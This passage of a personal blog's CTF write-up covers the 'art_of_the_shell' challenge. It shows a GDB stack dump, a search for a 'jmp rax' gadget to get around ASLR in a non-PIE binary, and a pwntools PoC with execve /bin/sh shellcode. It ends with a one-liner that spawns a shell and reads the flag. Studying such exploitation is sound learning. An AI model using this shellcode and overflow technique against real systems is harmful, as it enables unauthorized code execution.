<span class="err">0</span><span class="nl">x7fffffffd960:</span> <span class="err">0</span><span class="nf">x9090909090909090</span>  <span class="mh">0x9090909090909090</span>
<span class="err">0</span><span class="nl">x7fffffffd970:</span> <span class="err">0</span><span class="nf">xbb48c03190909090</span>  <span class="mh">0xff978cd091969dd1</span>
<span class="err">0</span><span class="nl">x7fffffffd980:</span> <span class="err">0</span><span class="nf">x52995f5453dbf748</span>  <span class="mh">0x41050f3bb05e5457</span>
<span class="err">0</span><span class="nl">x7fffffffd990:</span> <span class="err">0</span><span class="nf">x4141414141414141</span>  <span class="mh">0x4141414141414141</span>
<span class="err">0</span><span class="nl">x7fffffffd9a0:</span> <span class="err">0</span><span class="nf">x4141414141414141</span>  <span class="mh">0x0000424242424242</span>
<span class="err">0</span><span class="nl">x7fffffffd9b0:</span> <span class="err">0</span><span class="nf">x00007fffffffdaa8</span>  <span class="mh">0x0000000200000000</span>
<span class="err">0</span><span class="nl">x7fffffffd9c0:</span> <span class="err">0</span><span class="nf">x00000000004006b0</span>  <span class="mh">0x00007ffff7a2e830</span>
<span class="err">0</span><span class="nl">x7fffffffd9d0:</span> <span class="err">0</span><span class="nf">x0000000000000000</span>  <span class="mh">0x00007fffffffdaa8</span>
<span class="err">0</span><span class="nl">x7fffffffd9e0:</span> <span class="err">0</span><span class="nf">x00000002f7b99a28</span>  <span class="mh">0x0000000000400657</span>
<span class="err">0</span><span class="nl">x7fffffffd9f0:</span> <span class="err">0</span><span class="nf">x0000000000000000</span>  <span class="mh">0x28cf2e865791d517</span>
</pre></div>


<p>What we could do here is overwriting the saved return address with the start of our nopsled (<code>0x7fffffffd960</code>) on the stack. However, ASLR is enabled on the remote system making the starting stack address random each time the program is run.</p>
<p>Observing readers might have already noticed something interesting. <code>RAX</code> seems to point to the beginning our input. Instead of hardcoding the address of our nopsled on the stack, we could just simply find a way to call/ret/jmp to <code>RAX</code> which should start executing our nopsled and then our shellcode.</p>
<p>The reason this works is because when you compile a binary <em>without</em> PIE (position-independent executable) the starting address of the <strong>.TEXT</strong> section, which contains the programs executable instruction, does not get randomized on each run.</p>
<p>We'll use the handy <strong>jmpcall</strong> command provided by peda to find a suitable opcode sequence.</p>
<div class="highlight"><pre><span></span><span class="nf">gdb</span><span class="o">-</span><span class="nv">peda$</span> <span class="nv">jmpcall</span> <span class="nb">RAX</span>
<span class="err">0</span><span class="nf">x400565</span> <span class="p">:</span> <span class="nv">jmp</span> <span class="nb">rax</span>
<span class="err">0</span><span class="nf">x4005b3</span> <span class="p">:</span> <span class="nv">jmp</span> <span class="nb">rax</span>
<span class="err">0</span><span class="nf">x4005fe</span> <span class="p">:</span> <span class="nv">call</span> <span class="nb">rax</span>
<span class="err">0</span><span class="nf">x600565</span> <span class="p">:</span> <span class="nv">jmp</span> <span class="nb">rax</span>
<span class="err">0</span><span class="nf">x6005b3</span> <span class="p">:</span> <span class="nv">jmp</span> <span class="nb">rax</span>
<span class="err">0</span><span class="nf">x6005fe</span> <span class="p">:</span> <span class="nv">call</span> <span class="nb">rax</span>
<span class="nf">gdb</span><span class="o">-</span><span class="nv">peda$</span>
</pre></div>


<p>All we have to change with our initial PoC is adding the address of the <code>jmp rax</code> opcode sequence in reverse order (x86 is little endian).</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">sc</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0</span><span class="s2">&quot;</span> \
     <span class="s2">&quot;</span><span class="se">\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f</span><span class="s2">&quot;</span> \
     <span class="s2">&quot;</span><span class="se">\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05</span><span class="s2">&quot;</span> \

<span class="n">nops</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x90</span><span class="s2">&quot;</span><span class="o">*</span><span class="mi">20</span>


<span class="n">p</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
<span class="n">p</span> <span class="o">+=</span> <span class="n">nops</span>
<span class="n">p</span> <span class="o">+=</span> <span class="n">sc</span>
<span class="n">p</span> <span class="o">+=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="p">(</span><span class="mi">72</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">nops</span><span class="p">)</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">sc</span><span class="p">))</span>
<span class="n">p</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x60\x05\x65</span><span class="s2">&quot;</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="c1"># 0x600565: jmp rax</span>

<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
</pre></div>


<p>Side note: I'm not sure why, but pwntools <code>p64()</code> packing function didn't work here. Halp!</p>
<p>Running this inside GDB should now spawn a shell!</p>
<div class="highlight"><pre><span></span>gdb-peda$ run <span class="k">$(</span>python exploit.py<span class="k">)</span>
Starting program: /home/gbsn/ctf/angstrom/pwn/art/art_of_the_shell <span class="k">$(</span>python exploit.py<span class="k">)</span>
process <span class="m">8637</span> is executing new program: /bin/dash
$ whoami
<span class="o">[</span>New process <span class="m">8642</span><span class="o">]</span>
process <span class="m">8642</span> is executing new program: /usr/bin/whoami
gbsn
<span class="o">[</span>Inferior <span class="m">2</span> <span class="o">(</span>process <span class="m">8642</span><span class="o">)</span> exited normally<span class="o">]</span>
</pre></div>


<p><strong>Bingo!</strong> </p>
<p>All I had to do now was convert the PoC to a python oneliner to be run in the CTF shell.</p>
<div class="highlight"><pre><span></span>$ ./art_of_the_shell <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;\x90&quot;*20 + &quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot; + &quot;A&quot;*25 + &quot;\x60\x05\x65&quot;[::-1]&#39;</span><span class="k">)</span>
$ cat flag.txt
actf<span class="o">{</span>****************************<span class="o">}</span>
$
</pre></div>


<h2>Conclusion</h2>
<p>We successfully exploited a stack-based buffer overflow on a x86-64 elf binary. We also bypassed ASLR by reusing code from the non-randomized .TEXT section and executed our own shellcode spawning a shell, from which we gained elevated privileges and was able to read the flag file.</p>
  </div>
  <div class="tag-cloud">
    <p>
      <a href="https://gb-sn.github.io/tag/ctf.html">ctf</a>
    </p>
  </div>




</article>

    <footer>
<p>&copy; gbsn </p>
<p>    Powered by <a href="http://getpelican.com" target="_blank">Pelican</a> - <a href="https://github.com/alexandrevicenzi/flex" target="_blank">Flex</a> theme by <a href="http://alexandrevicenzi.com" target="_blank">Alexandre Vicenzi</a>
</p>    </footer>
  </main>





<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " gbsn ",
  "url" : "https://gb-sn.github.io",
  "image": "https://gb-sn.github.io/images/profile.jpg",
  "description": ""
}
</script>
</body>
</html>